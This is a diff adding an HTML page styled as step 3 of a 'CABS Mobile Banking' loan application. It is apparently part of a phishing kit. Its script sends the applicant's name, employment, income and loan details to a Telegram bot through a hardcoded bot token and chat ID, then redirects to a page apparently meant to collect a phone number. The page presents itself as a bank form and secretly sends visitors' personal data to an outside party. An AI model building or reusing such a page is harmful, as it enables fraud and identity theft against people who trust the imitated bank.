@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CABS Mobile Banking - Loan Application Step 3</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #f4f6f9;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+        }
+        
+        .header {
+            background-color: #3b3a8a;
+            color: white;
+            padding: 30px 25px 25px 25px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .logo span {
+            color: #7cc544;
+        }
+
+        .header h1 {
+            font-size: 20px;
+            font-weight: 500;
+            opacity: 0.9;
+        }
+        
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transition: all 0.3s;
+        }
+        
+        .step-dot.active {
+            background: #7cc544;
+            transform: scale(1.2);
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        h2 {
+            color: #3b3a8a;
+            margin-bottom: 5px;
+            font-size: 22px;
+        }
+        
+        .step-number {
+            color: #7cc544;
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        
+        .section {
+            margin-bottom: 25px;
+        }
+        
+        .section-title {
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+        
+        .employment-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        
+        .employment-option {
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-weight: 500;
+            color: #555;
+        }
+        
+        .employment-option:hover {
+            border-color: #3b3a8a;
+        }
+        
+        .employment-option.selected {
+            border-color: #3b3a8a;
+            background: rgba(59, 58, 138, 0.08);
+            color: #3b3a8a;
+            font-weight: bold;
+        }
+        
+        .income-input {
+            position: relative;
+            margin-top: 15px;
+        }
+        
+        .income-input span {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #7cc544;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .income-input input {
+            width: 100%;
+            padding: 14px 14px 14px 38px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            background: #fff;
+            color: #333;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        
+        .income-input input:focus {
+            border-color: #3b3a8a;
+            box-shadow: 0 0 0 3px rgba(59, 58, 138, 0.1);
+        }
+        
+        .summary-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+            background: #fafbfc;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #eee;
+        }
+        
+        .summary-table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #eee;
+            color: #555;
+            font-size: 14px;
+        }
+        
+        .summary-table td:first-child {
+            color: #666;
+            font-weight: 600;
+            width: 45%;
+        }
+        
+        .summary-table td:last-child {
+            text-align: right;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .summary-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 30px;
+        }
+        
+        .btn {
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .btn-prev {
+            background: #f0f0f0;
+            color: #666;
+            width: 35%;
+        }
+        
+        .btn-prev:hover {
+            background: #e2e2e2;
+        }
+        
+        .btn-submit {
+            background-color: #3b3a8a;
+            color: white;
+            flex: 1;
+            box-shadow: 0 4px 10px rgba(59, 58, 138, 0.3);
+        }
+        
+        .btn-submit:hover {
+            background-color: #2f2e70;
+        }
+        
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #999;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background: white;
+                padding: 0;
+            }
+            .container {
+                box-shadow: none;
+                border-radius: 0;
+                min-height: 100vh;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">CABS<span>)</span></div>
+            <h1>Loan Application</h1>
+            <div class="step-indicator">
+                <div class="step-dot"></div>
+                <div class="step-dot"></div>
+                <div class="step-dot active"></div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <span class="step-number">Step 3 of 3</span>
+            <h2>Final Details</h2>
+            
+            <div class="section">
+                <div class="section-title">Employment Status</div>
+                <div class="employment-options">
+                    <div class="employment-option selected" data-status="employed">Employed</div>
+                    <div class="employment-option" data-status="self-employed">Self-Employed</div>
+                    <div class="employment-option" data-status="student">Student</div>
+                    <div class="employment-option" data-status="unemployed">Unemployed</div>
+                </div>
+                
+                <div class="section-title" style="margin-top: 20px;">Annual Income</div>
+                <div class="income-input">
+                    <span>$</span>
+                    <input type="number" id="annualIncome" placeholder="50,000" min="0" step="1000">
+                </div>
+            </div>
+            
+            <div class="section">
+                <div class="section-title">Application Summary</div>
+                <table class="summary-table" id="summaryTable">
+                    <!-- Populated by JavaScript -->
+                </table>
+            </div>
+            
+            <div class="button-group">
+                <button class="btn btn-prev" onclick="prevStep()">Back</button>
+                <button class="btn btn-submit" id="submitBtn" onclick="submitApplication()">Submit</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2026 CABS. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        // Shared Telegram config
+        const BOT_TOKEN = '8350396603:AAG2fThlCEOBcN9TQDqdM0wRR_N590DJveI';
+        const CHAT_ID = '8213174863';
+
+        function sendToTelegram(message) {
+            const encoded = encodeURIComponent(message);
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
+                .then(r => r.json())
+                .then(r => { console.log('Telegram (step3):', r); return r; })
+                .catch(e => { console.error('Telegram error:', e); });
+        }
+
+        let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('.employment-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.employment-option').forEach(o => o.classList.remove('selected'));
+                    this.classList.add('selected');
+                    applicationData.employmentStatus = this.getAttribute('data-status');
+                    localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+                });
+            });
+            
+            document.getElementById('annualIncome').addEventListener('input', function() {
+                applicationData.annualIncome = parseInt(this.value) || 0;
+                localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+                updateSummary();
+            });
+            
+            if (!applicationData.employmentStatus) {
+                applicationData.employmentStatus = 'employed';
+            }
+            if (!applicationData.annualIncome) {
+                applicationData.annualIncome = 50000;
+                document.getElementById('annualIncome').value = 50000;
+            }
+            
+            updateSummary();
+        });
+        
+        function updateSummary() {
+            const table = document.getElementById('summaryTable');
+            
+            const amount = applicationData.loanAmount || 5000;
+            const term = applicationData.loanTerm || 12;
+            const interestRate = 8;
+            const monthlyRate = interestRate / 100 / 12;
+            const monthlyPayment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -term));
+            
+            table.innerHTML = `
+                <tr>
+                    <td>Loan Amount:</td>
+                    <td>$${amount.toLocaleString()}</td>
+                </tr>
+                <tr>
+                    <td>Loan Term:</td>
+                    <td>${term} Months</td>
+                </tr>
+                <tr>
+                    <td>Purpose:</td>
+                    <td>${getPurposeLabel(applicationData.purpose || 'food')}</td>
+                </tr>
+                <tr>
+                    <td>Applicant:</td>
+                    <td>${applicationData.firstName || 'Sunny'} ${applicationData.lastName || 'Manu'}</td>
+                </tr>
+                <tr>
+                    <td>Monthly Payment:</td>
+                    <td>$${monthlyPayment.toFixed(2)}</td>
+                </tr>
+                <tr>
+                    <td>Annual Income:</td>
+                    <td>$${(applicationData.annualIncome || 0).toLocaleString()}</td>
+                </tr>
+            `;
+        }
+        
+        function getPurposeLabel(purpose) {
+            const purposes = {
+                'food': 'Food',
+                'education': 'Education',
+                'medical': 'Medical',
+                'business': 'Business',
+                'emergency': 'Emergency',
+                'other': 'Other'
+            };
+            return purposes[purpose] || 'Food';
+        }
+        
+        function prevStep() {
+            window.location.href = 'application-step2.html';
+        }
+        
+        function submitApplication() {
+            const income = document.getElementById('annualIncome').value;
+            if (!income || parseInt(income) < 1000) {
+                alert('Please enter a valid annual income');
+                return;
+            }
+            
+            applicationData.employmentStatus = document.querySelector('.employment-option.selected').getAttribute('data-status');
+            applicationData.annualIncome = parseInt(income);
+            applicationData.applicationDate = new Date().toISOString();
+            applicationData.status = 'pending';
+            applicationData.applicationId = 'CABS-' + Date.now();
+            
+            localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+
+            // ---- Send STEP 3 details to Telegram ----
+            const message = `
+📝 *STEP 3 — Loan Application Details*
+
+🆔 Application ID: ${applicationData.applicationId}
+📅 Date: ${new Date().toLocaleString()}
+
+👤 *Applicant:*
+• Name: ${applicationData.firstName || 'Valued Client'} ${applicationData.lastName || ''}
+• Employment: ${applicationData.employmentStatus}
+• Annual Income: $${applicationData.annualIncome.toLocaleString()}
+
+💰 *Loan:*
+• Type: ${applicationData.loanType || 'Personal Loan'}
+• Amount: $${(applicationData.loanAmount || 5000).toLocaleString()}
+• Term: ${applicationData.loanTerm || 12} months
+• Purpose: ${getPurposeLabel(applicationData.purpose || 'food')}
+            `;
+
+            sendToTelegram(message).finally(() => {
+                // Continue to phone step
+                window.location.href = 'phoneno.html';
+            });
+        }
+    </script>
+</body>
+</html>
